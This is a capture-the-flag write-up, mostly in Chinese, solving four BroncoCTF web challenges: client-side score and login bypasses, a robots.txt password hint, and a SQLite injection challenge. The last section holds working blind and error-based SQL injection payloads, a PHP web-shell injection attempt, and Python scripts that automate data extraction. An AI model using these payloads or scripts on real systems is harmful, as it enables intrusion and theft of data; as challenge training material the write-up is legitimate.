---
title: "BroncoCTF2025web"
date: "2026-04-03T00:00:00+08:00"
lastmod: "2026-04-03T00:00:00+08:00"
slug: "BroncoCTF"
summary: "1.Unblur Me"
tags:
  - "Web"
  - "BroncoCTF"
params:
  protected: false
  commentId: "BroncoCTF"
  legacyId: "BroncoCTF"
---

# 1.Unblur Me

```js
js：
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Calculus Review</title>
  <style>
    body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; text-align: center; padding-top: 50px; }
    .box { border: 1px solid #00ff00; display: inline-block; padding: 30px; border-radius: 5px; background: #111; }
    input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; font-size: 1.2em; width: 100px; text-align: center; }
    button { background: #00ff00; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 10px; }
    
    .image-container {
      display: inline-block;
      border: 3px solid #00ff00;
      margin-top: 20px;
      margin-bottom: 20px;
      line-height: 0;
    }

    #flag-image { 
      display: block; 
      margin: 15px;
      max-width: 400px; 
      filter: blur(20px);
      transition: filter 0.5s ease;
      user-select: none;
      -webkit-user-drag: none;
      pointer-events: none; 
    }
    
    .stats { margin-bottom: 20px; font-size: 1.5em; }
  </style>
</head>
<body>

  <div class="box">
    <h1>CALCULUS REVIEW</h1>
    <p>Solve 500 derivatives to unblur the image and unlock a secret.</p>
    
    <div class="image-container">
      <img id="flag-image">
    </div>
    
    <div class="stats">Progress: <span id="score">0</span> / 500</div>
    
    <div id="quiz-area">
      <h2 id="question">Loading...</h2>
      <input type="text" id="answer" placeholder="?">
      <br>
      <button onclick="checkAnswer()">SUBMIT ANSWER</button>
    </div>
  </div>

  <script>
    let correctCount = 0;
    let currentAnswer = "";

    function generateProblem() {
      const type = Math.floor(Math.random() * 3);
      let questionText = "";
      let answer = 0;

      if (type === 0) {
        const a = Math.floor(Math.random() * 10) + 2;
        const b = Math.floor(Math.random() * 4) + 2;
        const c = Math.floor(Math.random() * 20) + 5;
        questionText = `f(x) = ${a}x<sup>${b}</sup> + ${c}x <br> Find f'(1)`;
        answer = (a * b) + c;
      } else if (type === 1) {
        const a = Math.floor(Math.random() * 10) + 5;
        const isSin = Math.random() > 0.5;
        if (isSin) {
          questionText = `f(x) = ${a}sin(x) <br> Find f'(&pi;/2)`;
          answer = 0;
        } else {
          questionText = `f(x) = ${a}cos(x) <br> Find f'(&pi;)`;
          answer = 0;
        }
      } else {
        const a = Math.floor(Math.random() * 5) + 1;
        const b = Math.floor(Math.random() * 5) + 1;
        questionText = `f(x) = (x + ${a})(x + ${b}) <br> Find f'(1)`;
        answer = 2 + a + b;
      }

      document.getElementById('question').innerHTML = questionText;
      currentAnswer = answer;
      document.getElementById('answer').value = "";
    }

    function checkAnswer() {
      const userAnswer = parseInt(document.getElementById('answer').value);
      if (userAnswer === currentAnswer) {
        correctCount++;
        document.getElementById('score').innerText = correctCount;
        if (correctCount >= 500) {
          document.getElementById('quiz-area').innerHTML = "<h2>ACCESS GRANTED</h2>";
          const flag = document.getElementById('flag-image');
          flag.style.filter = "none";
          flag.style.pointerEvents = "auto";
        } else {
          generateProblem();
        }
      } else {
        alert("WRONG! Starting over.");
        correctCount = 0;
        document.getElementById('score').innerText = correctCount;
        generateProblem();
      }
    }

    function loadSecretImage() {
      fetch('/api/v1/internal/fetch-config-blob')
        .then(response => {
          if (!response.ok) throw new Error("Failed to load");
          return response.blob();
        })
        .then(blob => {
          const blobUrl = URL.createObjectURL(blob);
          const img = document.getElementById('flag-image');
          img.src = blobUrl;
        })
        .catch(err => console.error("Error hiding image:", err));
    }

    generateProblem();
    loadSecretImage();
  </script>
</body>
</html>
```

```
全局作用域：你的脚本中 correctCount 是用 let 定义在全局的，控制台可以直接访问并修改它。
跳过逻辑：checkAnswer() 函数内部只判断 correctCount >= 500。一旦满足，它就会移除滤镜并显示图片。
```

```js
correctCount = 500;
document.getElementById('answer').value = currentAnswer;
checkAnswer();
```



# 2.Super Secure Server

```
我刚刚完成了我的第一个API开发，用来处理我个人网站的安全登录！为了更加安全，我甚至不会告诉你我的用户名，所以你真的不可能黑掉我的账号。
```

源码：

```js
let leakedUser = "";
			let leakedPass = "";

			fetch('/api/config')
				.then(res => res.json())
				.then(data => {
					leakedUser = data.username; 
					leakedPass = data.password;
				});

			document.getElementById('loginForm').addEventListener('submit', function(e) {
				e.preventDefault();

				const u = document.getElementById('username').value;
				const p = document.getElementById('password').value;
				const msgBox = document.getElementById('messageBox');

				// client-side password comparison
				if (u === leakedUser && p === leakedPass) {
					fetch('/login', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({ authenticated: true })
					})
					.then(res => res.json())
					.then(data => {
						if (data.success) {
							window.location.href = data.redirect;
						}
					});
				} else {
					msgBox.innerText = "Incorrect username or password!";
				}
			});
```

```
客户端验证缺陷（Client-Side Authentication Vulnerability）。代码里已经清清楚楚地写了：
在登录之前，浏览器会先去请求 /api/config，然后把拿到的用户名和密码存进 leakedUser 和 leakedPass 变量里。
既然验证是在本地进行的，根本不需要去猜密码，直接从内存里把它们“拿”出来就行。
```

控制台输入

```js
console.log("Username:", leakedUser);
console.log("Password:", leakedPass);
```

```
Username: SuperSecretUser 
Password: rji32orj932r3209r233sqmet4v2cxbns8
```

```
Here is your flag: bronco{d0nt_3xp0se_p@ssw0rd5!}
```



# 3.Lovely Login

```
欢迎来到我们全新的登录页面。开发者们信誓旦旦地说它很安全……但他们可能在正式上线前漏掉了一些细节。你能弄明白身份验证的原理，并以正确的用户身份登录吗？PS：请遵从我的意愿，不要抓取网页内容。
```

```python
  async function login() {
      const u = document.getElementById("u").value;
      const p = document.getElementById("p").value;

      const res = await fetch("/login", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({username: u, password: p})
      });

      document.getElementById("out").innerHTML = await res.text();
    }
```

随便填了密码登陆后

复制变成了：

```
 async function login() {       const u = document.getElementById("u").value;       const p = document.getElementById("p").value;        const res = await fetch("/login", {         method: "POST",         headers: {"Content-Type": "application/json"},         body: JSON.stringify({username: u, password: p})       });        document.getElementById("out").innerHTML = await res.text();     }
```

```
开始扫描......
https://broncoctf-lovely-login.chals.io/robots.txt

```

```
User-agent: *
Disallow: /security

# amVmZixzYXJhaCx hZG1pbixndWVzdA==
```

```
Internal Security Notes
Status: Work in progress

Passwords are derived from usernames
Current implementation stores them backwards for obfuscation
Planned upgrade: hashing + salting
TODO: remove this page before production deployment!
```

```
内部安全说明 状态：进行中 密码由用户名派生而来 当前实现方式为反向存储密码以进行混淆 计划升级：哈希 + 加盐 TODO：在生产部署前移除此页面
```

```
编码： amVmZixzYXJhaCx hZG1pbixndWVzdA==
解码后： jeff,sarah, admin,guest
```

```
密码是用户名的反向字符串
于是有
admin
nimda
```

```
bronco{R3v3rs1ng_1s_S3cure}
```

# 4.Forbidden Archives

```
I have recently gained access to these Forbidden Archives, though I've been trying to access a book titled "All of the World’s Knowledge" and it seems like there's another level of security as the high council of wizards have made it forbidden. Is there a way I can get around that?
```

```
我最近获得了进入禁忌档案馆的权限，但我尝试查阅一本名为《世界所有知识》的书时，似乎还有另一层安全措施，因为巫师最高议会已经将其列为禁书。请问有什么办法可以绕过这些限制吗？
```

dirsearch为空

过滤

```
select
der
VALUES
sqlite_version 被禁（无法直接调用内置系统函数）
table
or跟的东西被禁
```

```
0')  group by 1-- 
0')  group by 4-- 
The archives resist:
The ink smears: 1st GROUP BY term out of range - should be between 1 and 3 


```

```
1')AND(abs(case(length((select(name)from(sqlite_master)where(type)is('table')limit(1)))>1)when(1)then(0)else(0x8000000000000000)end))-- 




```

在 SQLite 中，报错注入（Error-based Injection）的思路与 MySQL（利用 `updatexml` 或 `extractvalue`）完全不同。SQLite 的错误信息通常非常简短（如 "SQL error"），不会直接带出数据。

因此，SQLite 的报错注入本质上是**“布尔盲注的变体”**：利用特定的函数在特定条件下**触发整数溢出**，导致数据库报错。通过观察网页返回的是“正常成功”还是“数据库错误”，来逐位判断数据。

文献：https://550532788.github.io/2020/08/10/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8B%E7%BB%95%E8%BF%87SQLite%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97/

```sql
1')AND(abs(case(length(hex((select(title)from(scrolls)limit(1)offset(1))))>0)when(1)then(0)else(0x8000000000000000)end))-- 
报错The archives resist:
The ink smears: no such table: scrolls
```

```sql
1')AND(abs(case(1)when(0)then(0)else(0x8000000000000000)end))--这里The archives resist:
The ink smears: integer overflow（整型溢出）
```

```sql
');ATTACH DATABASE '/var/www/html/sqlite_test/shell.php' AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES ('<?php @eval($_POST["x"]); ?>'); --  然后说：The archives resist:
The ink smears: You can only execute one statement at a time.
```

这里拒绝了堆叠注入

```sql
0')||(id=(VALUES(1),(2)))--
```

回显：

```
A Wizard of Earthsea
Scribe: Ursula K. Le Guin

A young mage accidentally releases a shadow creature.
```

```sql
0')||(id)IN(SELECT(id)FROM(books)LIMIT(1)OFFSET(1))--
```

```
The Name of the Wind
Scribe: Patrick Rothfuss

The life story of a legendary musician and arcanist.
```

ok这是一个逻辑判断

```sql
0')||(id=(SELECT(id)FROM(books)LIMIT(1)OFFSET(CASE(length((SELECT(MIN(name))FROM(sqlite_master))))WHEN(5)THEN(1)ELSE(0)END)))--
回显了The Name of the Wind
说明表名就是5位数
```

```sql
?search=0')||(id=(SELECT(id)FROM(books)LIMIT(1)OFFSET(CASE((SELECT(MIN(name))FROM(sqlite_master))LIKE'f%')WHEN(1)THEN(1)ELSE(0)END)))--
```

```
CREATE TABLE books (id INTEGER, title TEXT, author TEXT, description TEXT, [这里是目标列名] TEXT)

1-18位: CREATE TABLE books
19-32位: (id INTEGER,
33-45位: title TEXT, <-- 你刚才跑到了这里
46-60位: author TEXT,
61-80位: description TEXT,
81-110位: [关键列名] TEXT <-- Flag 就在这里！
111-115位: )
```

exp

爆表名：

```python
import requests

# 配置信息
TARGET_URL = "https://broncoctf-forbidden-archives.chals.io"
TRUE_KEYWORD = "The Name of the Wind"
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789_{}"

def check(condition):
    # 直接使用单引号 ' 和 %，逻辑非常直观
    payload = f"0')||(id=(SELECT(id)FROM(books)LIMIT(1)OFFSET(CASE({condition})WHEN(1)THEN(1)ELSE(0)END)))--"
    params = {'search': payload}
    try:
        r = requests.get(TARGET_URL, params=params, timeout=10)
        return TRUE_KEYWORD in r.text
    except:
        return False

def run():
    # 1. 拿第一个表名
    table_name = ""
    # 先确定长度（假设最大20）
    length = 0
    for l in range(1, 21):
        if check(f"length((SELECT(MIN(name))FROM(sqlite_master)))=={l}"):
            length = l
            break
    print(f"[+] Table 1 Length: {length}")

    # 逐位爆破内容
    for i in range(length):
        for char in CHARS:
            # 直接用 LIKE 'abc%' 这种标准语法
            if check(f"(SELECT(MIN(name))FROM(sqlite_master))LIKE'{table_name + char}%'"):
                table_name += char
                print(f"[>] Found: {table_name}")
                break
    
    print(f"\n[!] 第一个表名是: {table_name}")

    # 2. 如果第一个表是 books，找第二个表
    # 逻辑：WHERE name > 'books'
    # 你可以手动改一下上面的语句再跑一遍
if __name__ == "__main__":
    run()

```

爆列名

```python
import requests

# 1. 基础配置
TARGET_URL = "https://broncoctf-forbidden-archives.chals.io"
TRUE_KEYWORD = "The Name of the Wind"

def check(condition):
    # 构造 Payload：利用 OFFSET 0/1 翻书效应
    payload = f"0')||(id=(SELECT(id)FROM(books)LIMIT(1)OFFSET(CASE({condition})WHEN(1)THEN(1)ELSE(0)END)))--"
    params = {'search': payload}
    try:
        r = requests.get(TARGET_URL, params=params, timeout=5)
        return TRUE_KEYWORD in r.text
    except:
        return False

def run_fast_exploit():
    total_length = 115
    # 我们直接从第 85 位开始，跳过前面的 "CREATE TABLE books (..."
    start_pos = 85 
    result = ""
    
    print(f"[*] 正在跳过前 {start_pos-1} 位，直接探测关键列名...")

    for i in range(start_pos, total_length + 1):
        low = 32  # 可打印字符起始 (空格)
        high = 126 # 可打印字符结束 (~)
        
        while low <= high:
            mid = (low + high) // 2
            # 核心逻辑：利用 unicode(substr) 探测第 i 位字符的 ASCII 码
            condition = f"unicode(substr((SELECT(sql)FROM(sqlite_master)WHERE(name)=='books'),{i},1))>{mid}"
            
            if check(condition):
                low = mid + 1
            else:
                high = mid - 1
        
        # 最终确定的字符
        char = chr(low)
        result += char
        print(f"[>] 第 {i:03d} 位: {result}")
        
        # 实时观察：如果你看到了类似 "secret", "hidden", "flag" 这种词，或者看到了 ")", 
        # 说明列名已经出全了。
        if ")" in result:
            print("\n[!] 检测到括号闭合，爆破可能已完成。")
            break

    print(f"\n[!] 探测到的关键片段：\n{result}")

if __name__ == "__main__":
    run_fast_exploit()

```

二分法导致字符偏移

调整后：

```python
import requests

# 配置
TARGET_URL = "https://broncoctf-forbidden-archives.chals.io"
TRUE_KEYWORD = "The Name of the Wind"

# 严格按照题目给出的字符集：a-z, A-Z, 0-9, _, !, @, #, $, %, ^, &, *, '
# 建议先跑小写和数字，速度最快
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&*'" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def check(condition):
    payload = f"0')||(id=(SELECT(id)FROM(books)LIMIT(1)OFFSET(CASE({condition})WHEN(1)THEN(1)ELSE(0)END)))--"
    params = {'search': payload}
    try:
        r = requests.get(TARGET_URL, params=params, timeout=5)
        return TRUE_KEYWORD in r.text
    except:
        return False

def get_exact_flag():
    # 从第8位开始爆破（跳过 bronco{）
    flag = "bronco{"
    print(f"[*] 正在从第 8 位开始精确匹配数据...")

    for i in range(8, 64):
        found = False
        for char in CHARS:
            # 逻辑：直接对比 ASCII 码是否完全一致
            # 锁定 is_secret 不为 0 的那一行的 description 字段
            condition = f"unicode(substr((SELECT(description)FROM(books)WHERE(is_secret)!='0'LIMIT(1)),{i},1))=={ord(char)}"
            
            if check(condition):
                flag += char
                print(f"[>] 准确位探测: {flag}")
                found = True
                break
        
        # 探测是否到了右括号 } (ASCII 125)
        if not found:
            if check(f"unicode(substr((SELECT(description)FROM(books)WHERE(is_secret)!='0'LIMIT(1)),{i},1))==125"):
                flag += "}"
                print(f"[!] 探测到结束符: {flag}")
                break
            else:
                print(f"[-] 第 {i} 位未匹配到预设字符，请检查字符集。")
                break
                
    print(f"\n[!] 最终 100% 正确的 Flag: {flag}")

if __name__ == "__main__":
    get_exact_flag()
```

```
bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}
```

